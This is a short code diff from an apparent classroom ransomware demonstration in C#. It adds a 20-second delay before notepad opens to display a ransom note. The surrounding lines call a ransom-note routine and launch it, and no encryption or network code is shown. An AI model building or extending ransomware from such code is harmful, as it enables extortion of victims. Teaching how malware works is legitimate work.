@@ -255,6 +255,8 @@ namespace Demo1
             RansomNote(ransomNote);
 
             // Open notepad to display the ransom note.
+
+            System.Threading.Thread.Sleep(20000);
             Process.Start("notepad.exe", ransomNote);
 
             Console.WriteLine("Adios clase!");
